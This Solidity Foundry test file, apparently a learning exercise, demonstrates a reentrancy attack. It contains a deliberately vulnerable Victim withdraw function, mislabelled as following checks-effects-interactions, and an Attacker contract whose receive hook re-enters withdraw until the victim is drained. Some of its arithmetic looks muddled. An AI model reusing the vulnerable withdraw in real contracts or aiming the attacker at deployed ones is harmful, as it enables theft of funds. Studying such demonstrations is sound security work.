// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

/*

contract Testing is Test{
    address user = vm.addr(1);

    function setUp() public {
        vm.deal(address(address(this)), 20 ether);
        vm.deal(user, 6 ether);
        console2.log(user.balance);
        console2.log(address(address(this)).balance);
    }

    function testDeposit() public {
        uint256 depositAmount = address(user).balance;
        console2.log(depositAmount);

        uint256 currentBalance = address(address(this)).balance;
        uint256 newShares = currentBalance / depositAmount ;
        assertEq(newShares, 3);
    }
}
*/

/*
// Victim contract with withdraw function using CEI
contract VictimTest is Test {
    Victim victim;
    Attacker attacker;
    address alice = vm.addr(1);

    function setUp() public {
        attacker = new Attacker(address(victim));
        console2.log("Attacker balance:", address(attacker).balance);
        victim = new Victim{value: 200 ether / 1e18}(address(attacker));
        console2.log("Victim balance:", address(victim).balance);
    }

    function testWithdraw() public {
        vm.prank(address(victim));
        victim.withdraw(address(attacker), 20 ether / 1e18);
        console2.log("Victim balance:", address(victim).balance / 1e18);
        console2.log("Attacker balance:", address(attacker).balance);
    }
}

// Victim contract with withdraw function using CEI
contract Victim {
    address attacker;
    mapping(address => uint256) public balances;

    constructor(address _attacker) payable {
        attacker = _attacker;
    }

    function withdraw(address recipient, uint256 amount) external {
        uint256 balance = address(this).balance;
        require(balance >= amount);

        balance -= amount;

        (bool sent,) = recipient.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

// Malicious contract to call back into victim
contract Attacker {
    Victim victim;

    constructor(address _victim) payable {
        victim = Victim(_victim);
    }

    receive() external payable {
        victim.withdraw(address(this), 40);
    }
}

*/

// Victim contract with withdraw function using CEI
contract VictimTest is Test {
    Victim victim;
    Attacker attacker;

    // forge test --mc VictimTest -vvvvv
    function setUp() public {
        victim = new Victim{value: 200 ether / 1e18}();

        attacker = new Attacker(address(victim));

        console2.log("Attacker balance:", address(attacker).balance);
        console2.log("Victim balance:", address(victim).balance);
    }

    function testWithdraw() public {
        vm.prank(address(victim));
        victim.withdraw(address(attacker), 20 ether / 1e18);
        console2.log("Victim balance:", address(victim).balance / 1e18);
        console2.log("Attacker balance:", address(attacker).balance);
    }
}

// Victim contract with withdraw function using CEI
contract Victim {
    event Received(address _sender,uint _amount);
    receive() external payable {
        emit Received(msg.sender,msg.value);
    }

    mapping(address => uint256) public balances;

    constructor() payable {
    }

    function withdraw(address recipient, uint256 amount) external {
        uint256 balance = address(this).balance;
        require(balance >= amount);

        balance -= amount;

        (bool sent,) = recipient.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

// Malicious contract to call back into victim
contract Attacker {
    Victim victim;
    event FundsStolen();

    constructor(address _victim) payable {
        victim = Victim(payable(_victim));
    }

    receive() external payable {
        uint val=address(victim).balance;
        if (val==0)  emit FundsStolen();
        else victim.withdraw(address(this),val);
    }
}